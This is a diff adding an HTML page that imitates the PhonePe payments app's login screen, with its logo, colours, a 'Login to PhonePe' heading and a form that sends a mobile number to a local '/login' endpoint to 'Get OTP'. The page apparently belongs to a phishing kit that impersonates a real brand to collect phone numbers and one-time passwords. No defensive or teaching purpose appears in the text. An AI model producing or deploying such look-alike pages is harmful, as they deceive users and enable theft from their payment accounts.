@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>PhonePe - Get OTP</title>
+  <link rel="icon" href="/static/logo.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body {
+      background: #4a148c;
+      font-family: Arial, sans-serif;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+
+    .box {
+      background: white;
+      width: 90%;
+      max-width: 400px;
+      height: 440px;
+      padding: 50px 30px;
+      border-radius: 12px;
+      box-shadow: 0 0 20px rgba(0, 0, 0, 0.15);
+      text-align: center;
+    }
+
+    .box img {
+      width: 180px; /* Enlarged */
+      height: auto;
+      margin-bottom: 25px;
+    }
+
+    .box h3 {
+      margin-bottom: 25px;
+      font-size: 22px;
+      color: #333;
+    }
+
+    .box input[type="text"] {
+      width: 100%;
+      padding: 16px;
+      font-size: 17px;
+      margin-bottom: 30px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      box-sizing: border-box;
+    }
+
+    .box input[type="submit"] {
+      width: 100%;
+      padding: 14px;
+      font-size: 16px;
+      color: white;
+      background-color: #4a148c;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+    }
+
+    .box input[type="submit"]:hover {
+      background-color: #380d61;
+    }
+  </style>
+</head>
+<body>
+  <div class="box">
+    <img src="/static/logo.png" alt="PhonePe Logo" style="width: 180px;">
+    <h3>Login to PhonePe</h3>
+    <form action="/login" method="POST">
+      <input type="text" name="mobile" placeholder="Enter Mobile Number" maxlength="10" required>
+      <input type="submit" value="Get OTP">
+    </form>
+  </div>
+</body>
+</html>
